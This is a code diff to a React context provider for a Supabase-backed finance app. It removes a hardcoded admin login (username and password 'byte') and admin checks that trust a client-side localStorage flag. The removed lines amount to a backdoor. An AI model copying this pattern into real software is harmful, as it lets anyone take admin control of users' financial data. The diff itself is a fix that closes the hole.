@@ -179,10 +179,8 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
       setTransactions(allTransactions);
       setUsers(allProfiles);
 
-      if (localStorage.getItem('geld_admin_session') === 'true') {
-        setCurrentUser(ADMIN_USER);
-      } else {
-        const { data: { session } } = await supabase.auth.getSession();
+      
+      const { data: { session } } = await supabase.auth.getSession();
         if (session?.user) {
           const profile = allProfiles.find(p => p.id === session.user.id) || null;
           setCurrentUser(profile);
@@ -191,7 +189,7 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
             setInvestments(userInvestments);
           }
         }
-      }
+      
     } catch (err) {
       console.error('Failed to load data:', err);
     } finally {
@@ -212,10 +210,7 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
       if (!mounted) return;
-      if (localStorage.getItem('geld_admin_session') === 'true') {
-        setCurrentUser(ADMIN_USER);
-        return;
-      }
+     
       if (event === 'SIGNED_IN' && session?.user) {
         const [allProfiles, allTxs] = await Promise.all([
           getAllProfiles(),
@@ -251,24 +246,12 @@ export const AppProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     const cleanU = username.trim().toLowerCase();
     const cleanP = password.trim().toLowerCase();
 
-    if (cleanU === 'byte' && cleanP === 'byte') {
-      localStorage.setItem('geld_admin_session', 'true');
-      setCurrentUser(ADMIN_USER);
-      const [allTxs, allProfiles] = await Promise.all([
-        getAllTransactions(),
-        getAllProfiles(),
-      ]);
-      setTransactions(allTxs);
-      setUsers(allProfiles);
-      setCurrentView('admin');
-      showToast('success', 'Admin Portal Activated', 'Welcome System Administrator');
-      return true;
-    }
+   
 
     const result = await signInWithUsername(username, password);
     if (result.user) {
       if (result.user.isAdmin) {
-        localStorage.setItem('geld_admin_session', 'true');
+       
       }
       setCurrentUser(result.user);
       const [userInvestments, allTxs, allProfiles] = await Promise.all([
